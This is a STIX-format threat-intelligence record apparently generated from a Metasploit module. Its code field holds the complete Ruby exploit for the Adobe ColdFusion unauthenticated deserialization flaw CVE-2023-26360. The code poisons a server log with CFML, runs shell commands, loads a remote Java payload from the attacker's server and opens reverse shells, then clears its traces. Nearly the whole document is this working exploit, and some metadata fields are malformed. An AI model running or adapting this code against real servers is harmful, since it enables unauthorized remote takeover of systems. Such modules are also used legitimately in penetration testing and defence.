{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3e9e0f95-ffcc-4ec4-b10c-c567e847425d",
    "created": "2024-08-14T17:11:17.428818Z",
    "modified": "2024-08-14T17:11:17.428822Z",
    "name": "Adobe ColdFusion Unauthenticated Remote Code Execution",
    "description": " This module exploits a remote unauthenticated deserialization of untrusted data vulnerability in Adobe ColdFusion 2021 Update 5 and earlier as well as ColdFusion 2018 Update 15 and earlier, in order to gain remote code execution.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/adobe_coldfusion_rce_cve_2023_26360.rb",
            "external_id": "adobe_coldfusion_rce_cve_2023_26360.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2023-26360"
        },
        {
            "source_name": "reference",
            "url": "https://attackerkb.com/topics/F36ClHTTIQ/cve-2023-26360/rapid7-analysis"
        },
        {
            "source_name": "#NOTE:IfourURLendswith/aXXX.classisloaded",
            "external_id": "ifnotrailingslashthenaJARisexpectedtobereturned."
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Adobe ColdFusion Unauthenticated Remote Code Execution',\n        'Description' => %q{\n          This module exploits a remote unauthenticated deserialization of untrusted data vulnerability in Adobe\n          ColdFusion 2021 Update 5 and earlier as well as ColdFusion 2018 Update 15 and earlier, in\n          order to gain remote code execution.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'sf', # MSF Exploit & Rapid7 Analysis\n        ],\n        'References' => [\n          ['CVE', '2023-26360'],\n          ['URL', 'https://attackerkb.com/topics/F36ClHTTIQ/cve-2023-26360/rapid7-analysis']\n        ],\n        'DisclosureDate' => '2023-03-14',\n        'Platform' => %w[java win linux unix],\n        'Arch' => [ARCH_JAVA, ARCH_CMD, ARCH_X86, ARCH_X64],\n        'Privileged' => true, # Code execution as 'NT AUTHORITY\\SYSTEM' on Windows and 'nobody' on Linux.\n        'WfsDelay' => 30,\n        'Targets' => [\n          [\n            'Generic Java',\n            {\n              'Type' => :java,\n              'Platform' => 'java',\n              'Arch' => [ ARCH_JAVA ],\n              'DefaultOptions' => {\n                'PAYLOAD' => 'java/meterpreter/reverse_tcp'\n              }\n            },\n          ],\n          [\n            'Windows Command',\n            {\n              'Type' => :cmd,\n              'Platform' => 'win',\n              'Arch' => ARCH_CMD,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/windows/powershell_reverse_tcp'\n              }\n            },\n          ],\n          [\n            'Windows Dropper',\n            {\n              'Type' => :dropper,\n              'Platform' => 'win',\n              'Arch' => [ ARCH_X86, ARCH_X64 ],\n              'CmdStagerFlavor' => [ 'certutil', 'psh_invokewebrequest' ],\n              'DefaultOptions' => {\n                'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp'\n              }\n            }\n          ],\n          [\n            'Unix Command',\n            {\n              'Type' => :cmd,\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/reverse_perl'\n              }\n            },\n          ],\n          [\n            'Linux Dropper',\n            {\n              'Type' => :dropper,\n              'Platform' => 'linux',\n              'Arch' => [ARCH_X64],\n              'CmdStagerFlavor' => [ 'curl', 'wget', 'bourne', 'printf' ],\n              'DefaultOptions' => {\n                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'\n              }\n            }\n          ],\n        ],\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [\n            # The following artifacts will be left on disk:\n            # The compiled CFML class generated from the poisoned coldfusion-out.log (Note: the hash number will vary)\n            # * Windows: C:\\ColdFusion2021\\cfusion\\wwwroot\\WEB-INF\\cfclasses\\cfcoldfusion2dout2elog376354580.class\n            # * Linux: /opt/ColdFusion2021/cfusion/wwwroot/WEB-INF/cfclasses/cfcoldfusion2dout2elog181815836.class\n            # If a dropper payload was used, a file with a random name may be left.\n            # * Windows: C:\\Windows\\Temp\\XXXXXX.exe\n            # * Linux: /tmp/XXXXXX\n            ARTIFACTS_ON_DISK,\n            # The following logs will contain IOCs:\n            # C:\\ColdFusion2021\\cfusion\\logs\\coldfusion-out.log\n            # C:\\ColdFusion2021\\cfusion\\logs\\exception.log\n            # C:\\ColdFusion2021\\cfusion\\logs\\application.log\n            IOC_IN_LOGS\n          ],\n          'RelatedModules' => [\n            'auxiliary/gather/adobe_coldfusion_fileread_cve_2023_26360'\n          ]\n        }\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(8500),\n        OptString.new('URIPATH', [false, 'The URI to use for this exploit', '/']),\n        OptString.new('CFC_ENDPOINT', [true, 'The target ColdFusion Component (CFC) endpoint', '/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/iedit.cfc']),\n        OptString.new('CF_LOGFILE', [true, 'The target log file, relative to the wwwroot folder.', '../logs/coldfusion-out.log'])\n      ]\n    )\n  end\n\n  def check\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => '/'\n    )\n\n    return CheckCode::Unknown('Connection failed') unless res\n\n    # If ColdFusion is deployed with the Development profile (rather than Production) we will get a directory listing\n    # returned for the first request. We can detect that here and send a second request to a CFC endpoint that we\n    # know will return a ColdFusion cookie.\n    if res.code == 200 && res.body.include?('<title>Directory Listing For [/]</title>')\n      res = send_request_cgi(\n        'method' => 'GET',\n        'uri' => '/CFIDE/componentutils/cfcexplorer.cfc'\n      )\n\n      return CheckCode::Unknown('Connection failed') unless res\n    end\n\n    # We cannot identify the ColdFusion version through a generic technique. Instead we use the Recog fingerprint\n    # to match a ColdFusion cookie, and use this information to detect ColdFusion as being present.\n    # https://github.com/rapid7/recog/blob/main/xml/http_cookies.xml#L69\n\n    if res.get_cookies =~ /(CFCLIENT_[^=]+|CFGLOBALS|CFID|CFTOKEN)=|.cfusion/\n      return CheckCode::Detected('ColdFusion detected but version number is unknown.')\n    end\n\n    CheckCode::Unknown\n  end\n\n  def exploit\n    unless datastore['CFC_ENDPOINT'].end_with?('.cfc')\n      fail_with(Failure::BadConfig, 'The CFC_ENDPOINT must point to a .cfc file')\n    end\n\n    case target['Type']\n    when :java\n      # Start the HTTP server\n      start_service\n\n      # Trigger a loadClass request via java.net.URLClassLoader\n      trigger_urlclassloader\n\n      # Handle the payload...\n      handler\n    when :cmd\n      execute_command(payload.encoded)\n    when :dropper\n      execute_cmdstager\n    end\n  end\n\n  def on_request_uri(cli, _req)\n    if target['Type'] == :java\n      print_status('Received payload request, transmitting payload jar...')\n\n      send_response(cli, payload.encoded, {\n        'Content-Type' => 'application/java-archive',\n        'Connection' => 'close',\n        'Pragma' => 'no-cache'\n      })\n    else\n      super\n    end\n  end\n\n  def trigger_urlclassloader\n    # Here we construct a CFML payload to load a Java payload via URLClassLoader.\n\n    # NOTE: If our URL ends with / a XXX.class is loaded, if no trailing slash then a JAR is expected to be returned.\n\n    cf_url = Rex::Text.rand_text_alpha_lower(4)\n\n    srvhost = datastore['SRVHOST']\n\n    # Ensure SRVHOST is a routable IP address to our RHOST.\n    if Rex::Socket.addr_atoi(srvhost) == 0\n      srvhost = Rex::Socket.source_address(rhost)\n    end\n\n    # Create a URL pointing back to our HTTP server.\n    cfc_payload = \"<cfset #{cf_url} = createObject('java','java.net.URL').init('http://#{srvhost}:#{datastore['SRVPORT']}')/>\"\n\n    cf_reflectarray = Rex::Text.rand_text_alpha_lower(4)\n\n    # Get a reference to java.lang.reflect.Array so we can create a URL[] instance.\n    cfc_payload << \"<cfset #{cf_reflectarray} = createObject('java','java.lang.reflect.Array')/>\"\n\n    cf_array = Rex::Text.rand_text_alpha_lower(4)\n\n    # Create a URL[1] instance.\n    cfc_payload << \"<cfset #{cf_array} = #{cf_reflectarray}.newInstance(#{cf_url}.getClass(),1)/>\"\n\n    # Set the first element in the array to our URL.\n    cfc_payload << \"<cfset #{cf_reflectarray}.set(#{cf_array},0,#{cf_url})/>\"\n\n    cf_loader = Rex::Text.rand_text_alpha_lower(4)\n\n    # Create a URLClassLoader instance.\n    cfc_payload << \"<cfset #{cf_loader} = createObject('java','java.net.URLClassLoader').init(#{cf_array},javaCast('null',''))/>\"\n\n    # Load the remote JAR file and instantiate an instance of metasploit.Payload.\n    cfc_payload << \"<cfset #{cf_loader}.loadClass('metasploit.Payload').newInstance().main(javaCast('null',''))/>\"\n\n    execute_cfml(cfc_payload)\n  end\n\n  def execute_command(cmd, _opts = {})\n    cf_param = Rex::Text.rand_text_alpha_lower(4)\n\n    # If the cf_param is present in the HTTP requests www-form encoded data then proceed with the child tags.\n    cfc_payload = \"<cfif IsDefined('form.#{cf_param}') is 'True'>\"\n\n    # Set our cf_param with the data in the requests form data, this is the command to run.\n    cfc_payload << \"<cfset #{cf_param}=form.#{cf_param}/>\"\n\n    # Here we construct a CFML payload to stage the :cmd and :dropper commands...\n    shell_name = nil\n    shell_arg = nil\n\n    case target['Platform']\n    when 'win'\n      shell_name = 'cmd.exe'\n      shell_arg = '/C'\n    when 'linux', 'unix'\n      shell_name = '/bin/sh'\n      shell_arg = '-c'\n    end\n\n    cf_array = Rex::Text.rand_text_alpha_lower(4)\n\n    # Create an array of arguments to pass to exec()\n    cfc_payload << \"<cfset #{cf_array}=['#{shell_name}','#{shell_arg}',#{cf_param}]/>\"\n\n    cf_runtime = Rex::Text.rand_text_alpha_lower(4)\n\n    # Get a reference to the java.lang.Runtime class.\n    cfc_payload << \"<cfobject action='create' type='java' class='java.lang.Runtime' name='#{cf_runtime}'/>\"\n\n    # Call the static Runtime.exec method to execute our string array holding the command and the arguments.\n    cfc_payload << \"<cfset #{cf_runtime}.getRuntime().exec(#{cf_array})/>\"\n\n    # The end of the If tag.\n    cfc_payload << '</cfif>'\n\n    execute_cfml(cfc_payload, cf_param, cmd)\n  end\n\n  def execute_cfml(cfml, param = nil, param_data = nil)\n    cfc_payload = '<cftry>'\n\n    cfc_payload << cfml\n\n    cfc_payload << \"<cfcatch type='any'>\"\n\n    cfc_payload << '</cfcatch>'\n\n    cfc_payload << '<cffinally>'\n\n    # Clear the CF_LOGFILE which will contain this CFML code. We need to do this so we can repeatedly execute commands.\n    # GetCurrentTemplatePath returns 'C:\\ColdFusion2021\\cfusion\\wwwroot\\..\\logs\\coldfusion-out.log' as this is the\n    # template we are executing.\n    cfc_payload << \"<cffile action='write' file='#GetCurrentTemplatePath()#' output=''></cffile>\"\n\n    cfc_payload << '</cffinally>'\n\n    cfc_payload << '</cftry>'\n\n    # We can only log ~950 characters to a log file before the output is truncated, so we enforce a limit here.\n    unless cfc_payload.length < 950\n      fail_with(Failure::BadConfig, 'The CFC payload is too big to fit in the log file')\n    end\n\n    # We dont need to call a valid CFC method, so we just create a random method name to supply to the server.\n    cfc_method = Rex::Text.rand_text_alpha_lower(1..8)\n\n    # Perform the request that writes the cfc_payload to the CF_LOGFILE.\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(datastore['CFC_ENDPOINT']),\n      'vars_get' => { 'method' => cfc_method, '_cfclient' => 'true' },\n      'vars_post' => { '_variables' => \"{#{cfc_payload}\" }\n    )\n\n    # For Coldfusion deployed with the Development profile, success here will be a 500 error with a known title tag in\n    # the body. For Production profiles, success here will be a 200 response code and a different known title tag in\n    # the body.\n    unless res && ((res.code == 200 && res.body.include?('<title>Error</title>')) || ((res.code == 404 || res.code == 500) && res.body.include?('<title>Error Occurred While Processing Request</title>')))\n      fail_with(Failure::UnexpectedReply, 'Failed to plant the payload in the ColdFusion output log file')\n    end\n\n    # The relative path from wwwroot to the CF_LOGFILE.\n    cflog_file = datastore['CF_LOGFILE']\n\n    # To construct the arbitrary file path from the attacker provided class name, we must insert 1 or 2 characters\n    # to satisfy how coldfusion.runtime.JSONUtils.convertToTemplateProxy extracts the class name.\n    if target['Platform'] == 'win'\n      classname = \"#{Rex::Text.rand_text_alphanumeric(1)}#{cflog_file.gsub('/', '\\\\')}\"\n    else\n      classname = \"#{Rex::Text.rand_text_alphanumeric(1)}/#{cflog_file}\"\n    end\n\n    json_variables = \"{\\\"_metadata\\\":{\\\"classname\\\":#{classname.to_json}},\\\"_variables\\\":[]}\"\n\n    vars_post = { '_variables' => json_variables }\n\n    unless param.nil? || param_data.nil?\n      vars_post[param] = param_data\n    end\n\n    # Perform the request that executes the CFML we wrote to the CF_LOGFILE, while passing the shell command to be\n    # executed as a parameter which will in turn be read back out by the CFML in the cfc_payload.\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(datastore['CFC_ENDPOINT']),\n      'vars_get' => { 'method' => cfc_method, '_cfclient' => 'true' },\n      'vars_post' => vars_post\n    )\n\n    unless res && ((res.code == 200 && res.body.include?('<title>Error</title>')) || ((res.code == 404 || res.code == 500) && res.body.include?('<title>Error Occurred While Processing Request</title>')))\n      fail_with(Failure::UnexpectedReply, 'Failed to execute the payload in the ColdFusion output log file')\n    end\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2023-03-14",
    "x_mitre_platforms": [
        "linux'"
    ]
}